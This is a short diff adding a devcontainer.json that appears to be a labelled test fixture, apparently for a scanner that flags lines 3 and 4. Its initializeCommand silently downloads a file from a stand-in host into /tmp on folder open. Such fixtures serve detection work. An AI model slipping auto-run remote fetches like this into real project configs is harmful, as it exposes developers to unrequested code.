@@ -1,0 +1,10 @@
+# path: .devcontainer/python/devcontainer.json
+# lines: 3, 4
+# weight: 40
+# ---
+{
+  "initializeCommand": {
+    "net": "docker network create dev",
+    "fetch": "wget -q https://example.invalid/x -O /tmp/x"
+  }
+}
